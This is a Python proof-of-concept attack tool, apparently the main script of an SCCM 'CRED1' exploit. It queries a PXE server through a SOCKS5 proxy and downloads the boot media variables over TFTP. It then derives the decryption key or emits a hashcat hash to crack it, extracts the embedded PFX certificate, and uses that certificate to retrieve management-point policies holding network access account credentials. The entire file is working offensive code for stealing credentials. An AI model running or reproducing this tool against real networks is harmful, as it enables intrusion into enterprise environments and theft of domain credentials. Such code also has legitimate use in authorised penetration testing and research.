from lib.policy import PolicyRetriever
import argparse
import binascii
import os
import xml.etree.ElementTree as ET

# Parse arguments
parser = argparse.ArgumentParser(description="SCCM CRED1 SOCKS5 POC")
subparsers = parser.add_subparsers(dest="mode", required=True)

# Attack mode
attack_parser = subparsers.add_parser("attack", help="Run the CRED1 attack against a PXE server")
attack_parser.add_argument("target", help="SCCM PXE IP")
attack_parser.add_argument("src_ip", help="Source IP")
attack_parser.add_argument("socks_host", help="SOCKS5 proxy host")
attack_parser.add_argument("socks_port", help="SOCKS5 proxy port", type=int)
attack_parser.add_argument("-p", "--password", help="Cracked password (hex) for password-protected media file", type=str, default=None)
attack_parser.add_argument("-o", "--output", help="Output directory for loot files", type=str, default="./loot")

# Decrypt mode — decrypt a local .boot.var file with a key
decrypt_parser = subparsers.add_parser("decrypt", help="Decrypt a locally downloaded .boot.var file")
decrypt_parser.add_argument("file", help="Path to the .boot.var file")
decrypt_parser.add_argument("key", help="Decryption key (hex)")
decrypt_parser.add_argument("-o", "--output", help="Output directory for loot files", type=str, default="./loot")

# Loot mode — extract PFX and info from already-decrypted XML
loot_parser = subparsers.add_parser("loot", help="Extract PFX cert and info from decrypted media variables XML")
loot_parser.add_argument("xml_file", help="Path to decrypted media variables XML file")
loot_parser.add_argument("-o", "--output", help="Output directory for loot files", type=str, default="./loot")

# Policies mode — retrieve and decrypt policies from MP using PFX cert
policies_parser = subparsers.add_parser("policies", help="Retrieve policies from MP using PFX cert (extracts NAA creds)")
policies_parser.add_argument("xml_file", help="Path to variables.xml (decrypted media variables XML)")
policies_parser.add_argument("-o", "--output", help="Output directory for policy files", type=str, default="./loot")
policies_parser.add_argument("--mp", help="Override management point URL", type=str, default=None)
policies_parser.add_argument(
    "--fallback-local",
    help="After remote retrieval, also process local .raw blobs as fallback",
    action="store_true",
)
policies_parser.add_argument(
    "--fallback-input",
    help="Input dir for fallback .raw blobs (default: --output dir)",
    type=str,
    default=None,
)

# Local policies mode — decrypt already downloaded .raw policy blobs
policies_local_parser = subparsers.add_parser(
    "policies-local",
    help="Decrypt local policy .raw blobs using PFX from media XML",
)
policies_local_parser.add_argument("xml_file", help="Path to variables.xml (decrypted media variables XML)")
policies_local_parser.add_argument(
    "-i", "--input", help="Directory containing NAAConfig.raw/TaskSequence_*.raw", type=str, default="./loot"
)
policies_local_parser.add_argument("-o", "--output", help="Output directory for decrypted policy files", type=str, default="./loot")

args = parser.parse_args()

def handle_decrypted_xml(sccm_client, decrypted_xml, output_dir):
    """Extract PFX cert and key info from decrypted media variables."""
    print("[*] Extracting loot from decrypted media variables...")
    sccm_client.extract_media_variables(decrypted_xml, output_dir)

if args.mode in ("policies", "policies-local"):
    # Retrieve/decrypt policies using PFX from decrypted media variables XML
    with open(args.xml_file, "r") as f:
        xml_text = f.read()

    root = ET.fromstring(xml_text.encode("utf-16-le"))
    mp_url = root.find('.//var[@name="SMSTSMP"]').text
    if args.mode == "policies" and args.mp:
        mp_url = args.mp
    site_code = root.find('.//var[@name="_SMSTSSiteCode"]').text
    media_guid = root.find('.//var[@name="_SMSMediaGuid"]').text
    pfx_hex = root.find('.//var[@name="_SMSTSMediaPFX"]').text
    pfx_bytes = bytes.fromhex(pfx_hex)
    pfx_password = media_guid[:31]

    print(f"[*] Management Point: {mp_url}")
    print(f"[*] Site Code: {site_code}")
    print(f"[*] Media GUID: {media_guid}")
    print(f"[*] PFX Password: {pfx_password}")

    retriever = PolicyRetriever(mp_url, site_code, pfx_bytes, pfx_password)
    if args.mode == "policies":
        retriever.retrieve_policies(media_guid, args.output)
        if args.fallback_local:
            fallback_input = args.fallback_input or args.output
            print(f"[*] Running local fallback from {os.path.abspath(fallback_input)}")
            retriever.process_local_policy_blobs(fallback_input, args.output)
    else:
        print(f"[*] Input directory: {os.path.abspath(args.input)}")
        retriever.process_local_policy_blobs(args.input, args.output)
    exit()

if args.mode == "loot":
    # Extract from already-decrypted XML
    from lib import sccm

    sccm_client = sccm.SCCM(None, None, None)
    with open(args.xml_file, "r") as f:
        xml_text = f.read()
    sccm_client.extract_media_variables(xml_text, args.output)
    exit()

if args.mode == "decrypt":
    # Decrypt a local file with the given key
    from lib import sccm

    sccm_client = sccm.SCCM(None, None, None)
    try:
        with open(args.file, "rb") as f:
            filedata = f.read()
        print(f"[*] File size: {len(filedata)} bytes")
        aes_bits = sccm_client.detect_encryption_type(filedata)
        print(f"[*] Encryption: AES-{aes_bits}" if aes_bits else "[!] Unknown encryption type in header")
        key_bytes = bytes.fromhex(args.key)
        decrypted = sccm_client.decrypt_media_file(filedata, key_bytes)
        handle_decrypted_xml(sccm_client, decrypted, args.output)
    except Exception as e:
        print(f"[!] Decryption failed: {e}")
    exit()

# Attack mode
if args.target == None or args.socks_host == None or args.socks_port == None or args.src_ip == None:
    print("Usage: python3 main.py <target> <src_ip> <socks_host> <socks_port>")
    exit()

# Attack-only imports (scapy-dependent)
from lib import sccm
from lib import socks, tftp

# Setup SOCKS5 client
client = socks.SOCKS5Client(args.socks_host, args.socks_port)
client.connect()

sccm_client = sccm.SCCM(args.target, 4011, client)
(variables,bcd,cryptokey) = sccm_client.send_bootp_request(args.src_ip, "11:22:33:44:55:66")

print(f"[*] Variables file: {variables}")
print(f"[*] BCD file: {bcd}")

client.close()

# Download the variables file via TFTP
client = socks.SOCKS5Client(args.socks_host, args.socks_port)
client.connect()

tftp_client = tftp.TFTPClient(args.target, 69, client)
data_variables = tftp_client.get_file(variables)

if data_variables is None:
    print("[!] TFTP download failed — file must be retrieved manually")
    print(f"[*] Download the variables file from: \\\\{args.target}\\REMINST{variables}")
    if cryptokey is not None:
        print("[*] No PXE password set (crypto key found in DHCP response)")
        decrypt_password = sccm_client.derive_blank_decryption_key(cryptokey)
        if decrypt_password:
            print(f"[*] Derived key: {decrypt_password.hex()}")
            print(f"[*] Then decrypt with: python3 main.py decrypt <variables_file> {decrypt_password.hex()}")
    else:
        print("[*] PXE media is password-protected (no crypto key in DHCP response)")
        print("[*] Then decrypt with: python3 main.py decrypt <variables_file> <cracked_password_hex>")
    exit()

if cryptokey is None:
    # Password IS set — no crypto key in DHCP response, need to crack the hash
    print("[*] PXE media is password-protected (no crypto key in DHCP response)")
    aes_bits = sccm_client.detect_encryption_type(data_variables)
    aes_label = f"aes{aes_bits}" if aes_bits else "aes128"
    print(f"[*] Detected encryption: AES-{aes_bits or 128}")
    hashcat_hash = f"$sccm${aes_label}${sccm_client.read_media_variable_file_header(data_variables).hex()}"

    if args.password:
        print("[*] Decrypting media file with supplied password...")
        try:
            password_bytes = bytes.fromhex(args.password)
            decrypted = sccm_client.decrypt_media_file(data_variables, password_bytes)
            handle_decrypted_xml(sccm_client, decrypted, args.output)
        except Exception as e:
            print(f"[!] Decryption failed: {e}")
            print(f"[*] You can also download the file manually from: \\\\{args.target}\\REMINST{variables}")
    else:
        print("[*] Hashcat hash:")
        print(hashcat_hash)
        print("[*] Crack this hash, then re-run with: -p <cracked_password_hex>")
        print(f"[*] Or download the variables file from: \\\\{args.target}\\REMINST{variables}")
        print(f"[*] Then decrypt with: python3 main.py decrypt <variables_file> <cracked_password_hex>")
else:
    # No password set — crypto key IS in the DHCP response, can decrypt directly
    print("[*] No PXE password set (crypto key found in DHCP response)")
    print("[*] Deriving decryption key...")
    decrypt_password = sccm_client.derive_blank_decryption_key(cryptokey)
    if decrypt_password:
        print("[*] Derived key: " + decrypt_password.hex())
        try:
            decrypted = sccm_client.decrypt_media_file(data_variables, decrypt_password)
            handle_decrypted_xml(sccm_client, decrypted, args.output)
        except Exception as e:
            print(f"[!] Decryption failed: {e}")
            print(f"[*] Download the variables file manually from: \\\\{args.target}\\REMINST{variables}")
            print(f"[*] Then decrypt with: python3 main.py decrypt <variables_file> {decrypt_password.hex()}")
